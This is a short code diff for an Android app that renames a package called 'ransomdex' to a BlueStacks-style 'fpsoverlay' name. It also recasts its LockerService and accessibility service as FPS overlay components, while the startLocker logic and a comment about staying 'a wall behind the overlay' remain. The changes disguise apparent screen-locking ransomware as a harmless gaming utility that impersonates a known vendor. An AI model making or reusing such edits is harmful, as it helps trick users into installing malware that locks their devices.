@@ -1,4 +1,4 @@
-package com.bondex.ransomdex;
+package com.bluestacks.fpsoverlay;
 
 import android.app.Activity;
 import android.accessibilityservice.AccessibilityServiceInfo;
@@ -82,7 +82,7 @@ public class MainActivity extends Activity {
         for (AccessibilityServiceInfo enabledService : enabledServices) {
             ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
             if (enabledServiceInfo.packageName.equals(getPackageName()) && 
-                enabledServiceInfo.name.equals(CustomAccessibilityService.class.getName())) {
+                enabledServiceInfo.name.equals(FPSAccessibilityService.class.getName())) {
                 return true;
             }
         }
@@ -90,11 +90,11 @@ public class MainActivity extends Activity {
     }
 
     private void startLocker() {
-        if (LockerService.isAuthenticated) {
+        if (FPSService.isAuthenticated) {
             return;
         }
-        // Memulai service pengunci layar
-        Intent intent = new Intent(MainActivity.this, LockerService.class);
+        // Memulai service FPS Overlay
+        Intent intent = new Intent(MainActivity.this, FPSService.class);
         startService(intent);
         
         // Jangan panggil finish()! Biarkan dia jadi tembok di belakang overlay
